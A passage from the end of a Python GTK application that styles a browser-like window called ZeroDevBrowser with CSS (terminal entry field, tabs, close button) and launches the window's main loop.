            .term-entry { background: rgba(0,0,0,0.2); color: #FFF; border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; padding: 4px; font-size: 11px;}
            
            /* Main Tabs */
            .glass-tabs header { background: #12141a; border-bottom: none; padding: 0 4px; }
            .glass-tabs tab { background: rgba(255,255,255,0.03); border: none; border-radius: 6px 6px 0 0; margin: 0 1px; padding: 2px 6px;}
            .glass-tabs tab:checked { background: #1E2228; }
            .tab-label-bold { color: #FFF; font-size: 11px; }
            .close-btn { background: transparent; color: #A0AAB5; border: none; padding: 2px; }
            .close-btn:hover { color: #FF4444; }
        '''
        provider = Gtk.CssProvider()
        provider.load_from_data(css)
        Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)

if __name__ == "__main__":
    win = ZeroDevBrowser()
    win.connect("destroy", Gtk.main_quit)
    win.show_all()
    Gtk.main()
